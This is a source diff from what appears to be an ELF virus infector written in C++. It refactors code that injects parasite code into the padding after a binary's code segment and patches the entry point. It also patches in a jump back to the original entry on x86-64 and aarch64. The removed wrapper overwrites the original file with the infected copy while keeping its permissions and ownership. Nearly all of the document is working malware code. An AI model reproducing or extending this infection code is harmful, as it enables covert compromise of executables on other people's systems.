@@ -3,11 +3,12 @@
 #include <linux/limits.h>
 #include "common/file_descriptor.hh"
 #include "common/patch_pattern.hh"
+#include "common/patch_relinguish_control.hh"
 #include "std/string.hh"
 
 namespace vt::infector {
 namespace {
-struct SilvioElfInfo {
+struct ElfPaddingInfo {
   uint64_t padding_size;
   Elf64_Off code_segment_end_offset;
   Elf64_Off parasite_offset;
@@ -69,7 +70,7 @@ void patch_phdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
 }
 
 Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
-                      const SilvioElfInfo& info) {
+                      const ElfPaddingInfo& info) {
   Elf64_Ehdr* header =
       reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
   Elf64_Addr original_entry_point = header->e_entry;
@@ -86,81 +87,18 @@ Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
 bool patch_parasite_and_resume_control(
     Elf64_Addr original_entry_point, size_t parasite_size,
     vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
-    SilvioElfInfo& info) {
+    ElfPaddingInfo& info) {
   auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-
-#if defined(__x86_64__)
-  // For x86-64, patch the jmp address to the original entry point.
-  // It is assumed that the inserted virus has at least 8 bytes of noop and
-  // that's where it jumps back to host.
-  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
-  // the jmp. The patched jump instruction is always 5 bytes.
-  auto cur = common::find<uint64_t>(host_mapping.base() + info.parasite_offset,
-                                    parasite_size, 0x9090909090909090);
-  if (cur == -1) {
-    // printf("failed to patch host entry\n");
-    return false;
-  }
-  int32_t rel = 0;
-  if (header->e_type == ET_EXEC) {
-    // for executables, the original entry is the load address, the parasite
-    // load address is the new memory address. Use that for offset calculation.
-    rel = original_entry_point - (info.parasite_load_address + cur + 5);
-  } else if (header->e_type == ET_DYN) {
-    // Both original and parasite offset are relative address to the process
-    // start, which is not known until runtime.
-    rel = original_entry_point - (info.parasite_offset + cur + 5);
-  } else {
-    CHECK_FAIL();
-  }
-  *(host_mapping.mutable_base() + info.parasite_offset + cur) = 0xe9;
-  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur + 1) =
-      rel;
-#elif defined(__aarch64__)
-  // For aarch64, patch the b address to the orignal entry point.
-  // It is assumed that the inserted virus has at least 4 bytes of noop and
-  // that's where it jumps back to host.
-
-  // b imm26
-  // 000101 imm26
-  // imm26 = rel / 4
-  // The rel is offset from the current instruction (b xxx)
-  // The patched jump instruction is always 4 bytes.
-  auto cur = common::find<uint32_t>(host_mapping.base() + info.parasite_offset,
-                                    parasite_size, 0xd503201f);
-  if (cur == -1) {
-    // printf("failed to patch host entry\n");
-    return false;
-  }
-  int32_t rel = 0;
-  if (header->e_type == ET_EXEC) {
-    // for executables, the original entry is the load address, the parasite
-    // load address is the new memory address. Use that for offset calculation.
-    rel = original_entry_point - (info.parasite_load_address + cur);
-  } else if (header->e_type == ET_DYN) {
-    // Both original and parasite offset are relative address to the process
-    // start, which is not known until runtime.
-    rel = original_entry_point - (info.parasite_offset + cur);
-  } else {
-    CHECK_FAIL();
-  }
-
-  rel /= 4;
-  auto* inst =
-      (int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur);
-
-  *inst = rel;
-  // fill in op-code
-  *inst &= (0b00010111111111111111111111111111);
-#endif
-  return true;
+  return patch_parasite_and_relinquish_control(
+      header->e_type, original_entry_point, info.parasite_load_address,
+      info.parasite_offset, parasite_size, host_mapping);
 }
 
 // Returns gap size (accomodation for parasite code in padding between CODE
 // segment and next segment after CODE segment) padding size,
 // code_segment_end_offset, parasite_offset, parasite_load_address
 bool get_info(const char* host_mapping, uint64_t parasite_size,
-              SilvioElfInfo& info) {
+              ElfPaddingInfo& info) {
   auto elf_header = (const Elf64_Ehdr*)host_mapping;
   uint16_t pht_entry_count = elf_header->e_phnum;
   Elf64_Off pht_offset = elf_header->e_phoff;
@@ -199,11 +137,11 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
       // in its padding between the end of CODE segment and start of next
       // loadable segment)
       info =
-          SilvioElfInfo{.padding_size = phdr_entry->p_offset - parasite_offset,
-                        .code_segment_end_offset = code_segment_end_offset,
-                        .parasite_offset = parasite_offset,
-                        .parasite_load_address = parasite_load_address,
-                        .patch_entry_idx = i - 1};
+          ElfPaddingInfo{.padding_size = phdr_entry->p_offset - parasite_offset,
+                         .code_segment_end_offset = code_segment_end_offset,
+                         .parasite_offset = parasite_offset,
+                         .parasite_load_address = parasite_load_address,
+                         .patch_entry_idx = i - 1};
       return true;
     }
   }
@@ -224,7 +162,7 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     return false;
   }
 
-  SilvioElfInfo info{};
+  ElfPaddingInfo info{};
   // Get padding size in host.
   if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
     // printf("Cannot correctly parse host elf\n");
@@ -258,67 +196,6 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Patch parasite to resume host code after execution.
   return patch_parasite_and_resume_control(
       original_entry_point, parasite_mapping.size(), host_mapping, info);
-}
-
-bool padding_infect64(const char* host_path, const char* parasite_path) {
-  vt::common::FileDescriptor host(host_path, O_RDONLY);
-  if (!host.valid()) {
-    return false;
-  }
-
-  vt::common::FileDescriptor parasite(parasite_path, O_RDONLY);
-
-  if (!parasite.valid()) {
-    return false;
-  }
-
-  char tmp[PATH_MAX];
-  auto len = strlen(host_path);
-  strcpy(tmp, host_path);
-  tmp[len] = '.';
-  tmp[len + 1] = '\0';
-
-  vt::common::FileDescriptor output(tmp, O_RDWR | O_CREAT, S_IRWXU);
-
-  if (!output.valid()) {
-    return false;
-  }
-  auto host_size = host.file_size();
-  ftruncate(output.handle(), host_size);
-
-  vt::common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(),
-                                           0);
-
-  vt::common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
-      host_mapping.size(), MAP_SHARED, output.handle(), 0);
-
-  // Make a writable copy of the host.
-  memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
-         host_mapping.size());
-
-  vt::common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
-                                               parasite.handle(), 0);
-  if (!padding_infect64(vt::move(output_host_mapping),
-                        vt::move(parasite_mapping))) {
-    return false;
-  }
-
-  // mimic the original file.
-  struct stat s;
-  if (fstat(host.handle(), &s) < 0) {
-    return false;
-  }
-  if (fchmod(output.handle(), s.st_mode) < 0) {
-    return false;
-  }
-  if (fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
-    return false;
-  }
-  // atomic swap and replace the orignal host with our infected one.
-  if (rename(tmp, host_path) < 0) {
-    return false;
-  }
-  return true;
 }
 
 }  // namespace vt::infector
